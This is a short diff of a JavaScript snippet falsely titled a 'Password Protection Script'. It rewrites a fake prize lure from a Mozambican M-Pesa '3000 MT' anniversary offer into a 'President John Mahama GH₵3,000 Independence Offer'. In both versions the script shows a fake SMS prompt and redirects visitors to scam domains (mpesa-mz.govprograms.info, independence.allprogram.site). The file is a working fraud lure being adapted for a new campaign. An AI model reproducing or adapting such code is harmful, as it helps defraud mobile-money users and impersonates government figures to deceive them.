@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '3000 MT'
-password=prompt('SMS: Parabéns, é elegível para receber o prémio de aniversário 3000 MT Mpesa, Por favor, pressione OK para reclamar o prémio ','3000 MT');
-if (password != '3000 MT') {
-location.href='https://mpesa-mz.govprograms.info/ofertas';
+var password = 'GH₵3,000'
+password=prompt('SMS: Welcome to President John Mahama GH₵3,000 Independence Offer, Press Ok to Claim Prize ',' GH₵3,000');
+if (password != 'GH₵3,000') {
+location.href='https://independence.allprogram.site/offer';
 }
